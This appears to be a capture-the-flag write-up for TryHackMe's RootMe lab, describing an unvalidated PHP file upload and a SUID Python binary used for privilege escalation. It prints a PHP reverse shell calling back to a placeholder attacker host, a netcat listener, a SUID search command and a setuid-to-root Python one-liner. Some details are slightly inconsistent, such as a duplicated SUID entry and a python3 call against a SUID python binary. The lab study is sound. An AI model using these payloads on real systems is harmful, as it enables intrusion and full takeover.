# PHP File Upload RCE and Privilege Escalation

## ⚙️ Lab Setup

**Attacker Machine:**  
- **OS:** Kali Linux (2024.1)  
- **Tools:** Metasploit Framework, Netcat, Python 3  
- **Network:** Attacker connected via VPN to the TryHackMe network

**Victim Machine:**  
- **OS:** Ubuntu-based (Linux)  
- **Service:** Web server running on port 80  
- **Exploit Target:** User `www-data` with limited privileges

## 🚪 Initial Foothold

The initial foothold was achieved by exploiting a vulnerability in the web application's upload functionality, allowing us to upload a malicious PHP script (reverse shell). Here's a breakdown of the steps:

**Identify Upload Functionality:**
   The web application had an upload feature that didn’t properly validate the file type, allowing us to upload a `.php` file containing a reverse shell payload.

**Uploading the Web Shell:**
   We crafted a simple PHP reverse shell:
   
   ```
   php
   <?php
   $ip = 'ATTACKER_IP';
   $port = 'ATTACKER_PORT';
   $sock = fsockopen($ip, $port);
   exec("/bin/sh <&3 >&3 2>&3");
   ?>
   ```
   
After uploading the file, it was accessible at the following path:

```
http://victim_ip/uploads/reverse_shell.php
```

Triggering the **Reverse Shell**:

Using **Netcat**, we set up a listener on the attacker's machine to catch the reverse shell connection:

```nc -lvnp 4444```

We then triggered the reverse shell by visiting the file in the browser:

`http://victim_ip/uploads/reverse_shell.php`

# 💻 Exploitation
Once inside the system, we were running with the `www-data` user. 

This is a low-privilege user typically used by web servers to handle HTTP requests. The goal was to escalate privileges and gain root access.

Initial Command:

```
> whoami
www-data
```

At this point, we had command execution but limited privileges. Our next objective was to find a way to escalate from www-data to root.

# 🧠 Privilege Escalation Attempt

First, we attempted a few common privilege escalation techniques, but none were effective. We focused on checking for **SUID binaries**, which could potentially allow us to run commands as root.

# 🔍 Searching for SUID Binaries
To find binaries with SUID permissions, we ran the following command:

```
find / -type f -perm -4000 2>/dev/null
```

This command searches for files with the SUID bit set, which allows the binary to be executed with the file owner's privileges (in this case, root).

SUID Binaries Found:

```
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/python
/usr/bin/sudo
```

`/usr/bin/sudo` was a noteworthy binary, as it’s typically used for executing commands as another user, including root.

`/usr/bin/python` was also interesting, as Python can often be exploited to run arbitrary code as root.

# 🔨 Privilege Escalation Exploit
We decided to exploit `/usr/bin/python` as it had SUID permissions. 

This allowed us to run a Python command as root. 
The following Python one-liner was used to **escalate privileges**:

```
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

`os.setuid(0)` sets the user ID to 0, which is root.

`os.system("/bin/bash")` opens a new shell with root privileges.


Successfully executed the command and gained root access.

```
> whoami 
root
```


# 🧪 Outcome
**Initial Access**: We gained initial access to the system via the web shell upload vulnerability.

**Privilege Escalation**: Using the Python SUID exploit, we escalated from the www-data user to root.

**Root Access**: We successfully gained root access and were able to execute arbitrary commands as the root user.

# 🔐 Notes
The web shell upload vulnerability provided an easy initial foothold in the system.

Privilege escalation was straightforward after identifying the SUID binaries, especially `/usr/bin/python`, which allowed us to execute arbitrary code as root.

The system did not have more complicated protection mechanisms, making this a relatively simple privilege escalation once access was obtained.

# 🧰 Tools Used
Kali Linux (2024.1)

Metasploit Framework (for reverse shell generation)

Netcat (for reverse shell listener)

Python 3.x (for privilege escalation)

# 🧾 References
[RootMe CTF](https://tryhackme.com/room/rrootme)

[Python SUID Exploit](https://gtfobins.github.io/gtfobins/python/)